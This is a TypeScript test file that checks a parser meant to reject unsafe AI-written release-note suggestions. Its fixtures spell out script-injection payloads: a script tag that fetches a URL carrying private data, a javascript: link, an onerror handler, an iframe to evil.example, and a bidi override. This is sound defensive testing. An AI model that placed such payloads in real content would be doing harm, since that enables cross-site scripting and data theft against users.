// Text an AI writer returns is outside input. parseAiText is the one way it becomes AiText, which
// is only ever stored as a suggestion: anything that is not text, carries script or is too long is
// rejected, and a rejected suggestion is never stored.
// See docs/specs/SPEC-01-plan-language-and-parser.md.
import assert from 'node:assert/strict';
import { test } from 'node:test';
import { parseAiText, planParser, writeReleaseNotes, type AiWriter } from '@revisum/engine';
import { memoryArtifactStore } from '../../support/memory-ports.ts';
import { PRIVATE_MARKER, signupPlan, testProject } from './plan-examples.ts';

const LIMIT = 200;

const NOT_TEXT: readonly (readonly [string, unknown])[] = [
  ['a number', 42],
  ['null', null],
  ['undefined', undefined],
  ['an object', { markdown: PRIVATE_MARKER }],
  ['an array of strings', [PRIVATE_MARKER]],
  ['a boolean', true],
  ['a boxed string', Object(PRIVATE_MARKER)],
];

const SCRIPT_BEARING: readonly (readonly [string, string])[] = [
  ['a script element', `Release notes <script>fetch("//x?${PRIVATE_MARKER}")</script>`],
  ['a javascript: link', `[details](javascript:alert('${PRIVATE_MARKER}'))`],
  ['an inline event handler', `<img src=x onerror=alert('${PRIVATE_MARKER}')>`],
  ['an iframe', `<iframe src="https://evil.example/${PRIVATE_MARKER}"></iframe>`],
  ['a bidirectional override', `Approved‮ ${PRIVATE_MARKER}`],
];

for (const [name, input] of NOT_TEXT) {
  test(`rejects ${name} as wrong_type`, { criterion: 'AC-SPEC-01-09' }, () => {
    const parsed = parseAiText(input, LIMIT);
    assert.equal(parsed.ok, false);
    assert.equal(parsed.ok ? undefined : parsed.error.code, 'wrong_type');
    assert.ok(!JSON.stringify(parsed).includes(PRIVATE_MARKER), 'the error does not echo the input');
  });
}

for (const [name, input] of SCRIPT_BEARING) {
  test(`rejects text with ${name} as unsafe_text`, { criterion: 'AC-SPEC-01-09' }, () => {
    assert.ok(input.length <= LIMIT, 'short enough that only the content can be the reason');
    const parsed = parseAiText(input, LIMIT);
    assert.equal(parsed.ok, false);
    assert.equal(parsed.ok ? undefined : parsed.error.code, 'unsafe_text');
    assert.ok(!JSON.stringify(parsed).includes(PRIVATE_MARKER), 'the error does not echo the input');
  });
}

test('rejects text one character over the limit as too_long', { criterion: 'AC-SPEC-01-09' }, () => {
  const parsed = parseAiText('a'.repeat(LIMIT + 1), LIMIT);
  assert.equal(parsed.ok, false);
  assert.equal(parsed.ok ? undefined : parsed.error.code, 'too_long');
});

test('rejects a very long text as too_long', { criterion: 'AC-SPEC-01-09' }, () => {
  const parsed = parseAiText(`${PRIVATE_MARKER} `.repeat(100_000), LIMIT);
  assert.equal(parsed.ok, false);
  assert.equal(parsed.ok ? undefined : parsed.error.code, 'too_long');
  assert.ok(!JSON.stringify(parsed).includes(PRIVATE_MARKER), 'the error does not echo the input');
});

// Counter-examples: plain text up to the limit, including multi-line prose such as release notes,
// is accepted unchanged.
test('accepts plain text of exactly the limit, unchanged', { criterion: 'AC-SPEC-01-09' }, () => {
  const text = 'a'.repeat(LIMIT);
  assert.deepEqual(parseAiText(text, LIMIT), { ok: true, value: text });
});

test('accepts multi-line plain prose, unchanged', { criterion: 'AC-SPEC-01-09' }, () => {
  const text = '## Sign-up\n\nNow with friendlier wording.\n- One fewer step.';
  assert.deepEqual(parseAiText(text, LIMIT), { ok: true, value: text });
});

// ---- Nothing is stored --------------------------------------------------------------------------

test('a rejected suggestion is never stored: only the deterministic draft is', { criterion: 'AC-SPEC-01-09' }, async () => {
  const parsed = planParser(testProject())(signupPlan());
  assert.ok(parsed.ok, JSON.stringify(parsed));
  const writers: readonly (readonly [string, AiWriter])[] = [
    ['non-text', { suggest: async () => ({ markdown: 'an object, not text' }) }],
    ['script-bearing', { suggest: async () => 'Great release! <script>steal()</script>' }],
    ['over-long', { suggest: async () => 'a'.repeat(1_000_000) }],
  ];
  for (const [name, writer] of writers) {
    const store = memoryArtifactStore();
    const written = await writeReleaseNotes(parsed.value, [], store, writer);
    assert.equal(written.suggestion, null, `${name}: no suggestion`);
    assert.notEqual(written.suggestionRejected, null, `${name}: the rejection is reported`);
    assert.deepEqual(store.references().map((reference) => reference.name), ['release-notes.md'], `${name}: only the draft is stored`);
  }

  // Positive control: an acceptable suggestion is stored beside the draft.
  const store = memoryArtifactStore();
  await writeReleaseNotes(parsed.value, [], store, { suggest: async (draft) => `${draft}\n\nNow with friendlier wording.` });
  assert.equal(store.references().length, 2, 'a safe suggestion is stored, so the checks above can fail');
});
